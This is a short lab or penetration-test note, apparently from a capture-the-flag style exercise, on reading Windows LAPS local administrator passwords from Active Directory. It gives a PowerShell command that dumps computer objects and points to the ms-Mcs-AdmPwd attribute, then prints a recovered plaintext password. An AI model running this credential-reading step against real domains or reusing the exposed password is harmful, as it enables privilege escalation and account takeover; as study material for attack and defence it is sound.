
If an user is part of the LAPS_Readers Group or has "ReadLAPSPassword" as policy set he can read the admin password.

LAPS or "Local Administrator Password Solution" is a in-built windows tool in which passwords of local admin accounts are being randomly generated. Only Administrators of this group are able to view passwords. 

Viewed the password of the local admin account with the following command:

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

The Password can be found under "ms-Mcs-AdmPwd".

```
Mm}KJq5P0%$I7U8zHP19Mk28
```
